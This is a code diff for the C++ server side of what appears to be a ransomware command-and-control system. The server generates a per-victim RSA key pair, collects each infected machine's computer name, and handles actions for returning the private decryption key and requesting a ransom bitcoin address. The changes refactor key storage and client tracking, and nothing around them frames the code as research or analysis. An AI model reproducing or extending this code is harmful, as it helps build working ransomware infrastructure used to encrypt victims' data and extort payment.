@@ -44,7 +44,11 @@ RSAKeys ServerInterface::GenerateRSAPair() {
 	EVP_PKEY_CTX_free(ctx);
 	EVP_PKEY_free(key);
 
-	return RSAKeys(pub, priv);
+	RSAKeys keys;
+	keys.bioPublicKey = pub;
+	keys.bioPrivateKey = priv;
+
+	return keys;
 }
 
 void ServerInterface::ListenForUDPMessages() {
@@ -57,7 +61,7 @@ void ServerInterface::ListenForUDPMessages() {
 
 	// receive while udp server is alive
 	while ( this->UDPServerDetails.alive == TRUE ) {
-		ClientRequest req;
+		ClientRequest req = {};
 		sockaddr_in   incomingAddr;
 		BOOL		  received = NetCommon::ReceiveData(req, this->UDPServerDetails.sfd, UDP, incomingAddr);
 		if ( !received )
@@ -110,10 +114,13 @@ BOOL ServerInterface::PerformTCPRequest(ClientMessage req, long cuid) {
 
 		responseCommand.action = RemoteAction::RETURN_PRIVATE_RSA_KEY;
 		//responseCommand.publicEncryptionKey = NetCommon::ConvertBIOToString(client.RSAPublicKey);
-		responseCommand.privateEncryptionKey = Serialization::ConvertBIOToString(client->Secrets.privateKey);
+		responseCommand.privateEncryptionKey = client->Secrets.strPrivateKey;
 		success = TCPSendMessageToClient(cuid, responseCommand);
 		std::cout << "sending\n";
 
+		break;
+	case ClientMessage::REQUEST_PUBLIC_ENCRYPTION_KEY:
+		SendTCPClientRSAPublicKey(cuid, client->Secrets.bioPublicKey);
 		break;
 	case ClientMessage::REQUEST_RANSOM_BTC_ADDRESS:
 		break;
@@ -123,27 +130,32 @@ BOOL ServerInterface::PerformTCPRequest(ClientMessage req, long cuid) {
 }
 
 void ServerInterface::TCPReceiveMessagesFromClient(long cuid) {
-	std::cout << "New thread created to receive messages from client " << cuid << std::endl;
+	GetClientComputerName(cuid);
 	Client* client = GetClientPtr(cuid);
-	BOOL receiving = FALSE;
 
 	if ( client == nullptr )
 		return;
-	
+
+	std::cout << "New thread created to receive messages from client " << client->ComputerName << std::endl;
+	BOOL receiving = TRUE;
+
 	// tcp receive main loop
 	do 
 	{
+		BIO* pk = NetCommon::GetBIOFromString(client->Secrets.strPrivateKey);
 		// get a client response usually after an action is performed on the remote host
 		if ( client->ExpectingResponse ) {
 			std::cout << "expecting response\n";
 			client->LastClientResponse = client->RecentClientResponse;
-			client->RecentClientResponse = ReceiveDataFrom<ClientResponse>(this->TCPServerDetails.sfd, TRUE, client->Secrets.privateKey);
+			client->RecentClientResponse = ReceiveDataFrom<ClientResponse>(this->TCPServerDetails.sfd, TRUE, pk);
 			continue;
 		}
 		
 		// receive data from client, decrypt it using their rsa key
-		ClientMessage receivedData = ReceiveDataFrom<ClientMessage>(client->TCPSocket, TRUE, client->Secrets.privateKey);
+		ClientMessage receivedData = ReceiveDataFrom<ClientMessage>(client->TCPSocket, TRUE, pk);
 		receiving = receivedData.valid;
+
+		std::cout << "Client name: " << client->ComputerName << std::endl;
 
 		PerformTCPRequest(receivedData, cuid);
 	} 
@@ -161,7 +173,7 @@ BOOL ServerInterface::SendTCPClientRSAPublicKey(long cuid, BIO* pubKey) {
 	BYTESTRING buffer = Serialization::SerializeString(base64);
 
 	BOOL sent = NetCommon::TransmitData(buffer, client->TCPSocket, TCP);
-	std::cout << "Sent RSA Pub Key (B64): " << base64 << std::endl;
+	std::cout << "Sent RSA Pub Key " << bio << std::endl;
 
 	return TRUE;
 }
@@ -182,10 +194,12 @@ void ServerInterface::AcceptTCPConnections() {
 		Client  newClient(clientSocket, 0, addr);
 		RSAKeys keys = GenerateRSAPair();
 		newClient.SetEncryptionKeys(keys);
+		newClient.Secrets.bioPrivateKey = keys.bioPrivateKey;
+		newClient.Secrets.bioPublicKey = keys.bioPublicKey;
 
 		AddToClientList(newClient); // add them to the client list
+		SendTCPClientRSAPublicKey(newClient.ClientUID, newClient.Secrets.bioPublicKey);
 		
-		SendTCPClientRSAPublicKey(newClient.ClientUID, newClient.Secrets.publicKey);
 		std::cout << "Good connection. Send TCP Client key\n";
 
 		// start receiving tcp data from that client for the lifetime of that client
@@ -194,6 +208,22 @@ void ServerInterface::AcceptTCPConnections() {
 
 		// TODO: make it so we can send information to the client
 	}
+}
+
+BOOL ServerInterface::GetClientComputerName(long cuid) {
+	Client* client = GetClientPtr(cuid);
+
+	BYTESTRING computerNameSerialized;
+	BOOL received = NetCommon::ReceiveData(computerNameSerialized, client->TCPSocket, TCP);
+	if ( !received )
+		return FALSE;
+
+	BYTESTRING decrypted = NetCommon::RSADecryptStruct(computerNameSerialized, client->Secrets.bioPrivateKey, TRUE);
+	std::string computerName = Serialization::BytestringToString(decrypted);
+	client->ComputerName = computerName.c_str();
+	std::cout << "Got client computer naem: " << client->ComputerName << " / " << computerName << std::endl;
+
+	return TRUE;
 }
 
 Server ServerInterface::NewServerInstance(SocketTypes serverType, int port) {
@@ -308,8 +338,8 @@ BOOL ServerInterface::PerformUDPRequest(ClientMessage req, sockaddr_in incomingA
 	switch ( req.action ) {
 	case ClientMessage::CONNECT_CLIENT:	
 		Client client(req.tcp, req.udp, incomingAddr);
-		
-		std::cout << "Client: " << client.UDPSocket  << std::endl;
+
+		std::cout << "Client UDP socket: " << client.UDPSocket << std::endl;
 
 		// client wants to connect so respond with tcp server details
 		hostent* host = GetHostByName(DNS_NAME.c_str());
@@ -331,10 +361,10 @@ BOOL ServerInterface::PerformUDPRequest(ClientMessage req, sockaddr_in incomingA
 
 Client* ServerInterface::GetClientPtr(long cuid) {
 	if ( !ClientIsInClientList(cuid) ) return nullptr;
-	return this->ClientList.at(cuid);
+	return &this->ClientList.at(cuid);
 }
 
-std::unordered_map<long, Client*>& ServerInterface::GetClientList() {
+std::unordered_map<long, Client>& ServerInterface::GetClientList() {
 	std::lock_guard<std::mutex> lock(ClientListMutex);
 	return this->ClientList;
 }
@@ -363,7 +393,7 @@ template <typename _Struct>
 _Struct ServerInterface::ReceiveDataFrom(SOCKET s, BOOL encrypted, BIO* rsaKey)
 {
 	_Struct outData;
-	BOOL received = NetCommon::ReceiveData(outData, s, SocketTypes::TCP, NetCommon::_default, encrypted, rsaKey);
+	BOOL received = NetCommon::ReceiveData(outData, s, SocketTypes::TCP, NetCommon::_default, encrypted, rsaKey, TRUE);
 	if ( !received )
 		return {};
 
@@ -378,7 +408,7 @@ BOOL ServerInterface::AddToClientList(Client client) {
 	std::cout << "Adding client to list\n";
 	
 	ClientListMutex.lock();	
-	this->ClientList.insert(std::make_pair(client.ClientUID, &client));
+	this->ClientList.insert(std::make_pair(client.ClientUID, client));
 	 
 	ClientListMutex.unlock();
 	
